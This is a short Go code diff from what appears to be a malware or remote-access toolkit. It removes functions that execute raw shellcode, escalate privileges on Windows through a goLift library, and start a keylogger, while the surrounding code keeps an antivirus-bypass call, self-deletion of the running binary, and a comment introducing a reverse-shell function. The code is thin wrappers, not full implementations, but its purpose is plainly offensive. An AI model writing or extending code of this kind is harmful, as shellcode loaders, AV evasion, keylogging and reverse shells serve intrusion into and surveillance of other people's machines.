@@ -18,7 +18,6 @@ import (
 	"time"
 
 	"github.com/fatih/color"
-	goLift "github.com/whiterabb17/goLift"
 )
 
 var (
@@ -189,25 +188,8 @@ func Remove() {
 	os.Remove(os.Args[0])
 }
 
-func SysShellExec(shellcode []byte) {
-	SyscallExecute(shellcode)
-}
-
 func Bypass() {
 	BypassAV()
-}
-
-func Escalate(path string) string {
-	var _err error
-	if runtime.GOOS == "windows" {
-		err := goLift.WEscalate(path)
-		_err = err
-	}
-	return _err.Error()
-}
-
-func LogKeys() {
-	startLogger(0)
 }
 
 // Reverse initiates a reverse shell to a given host:port.
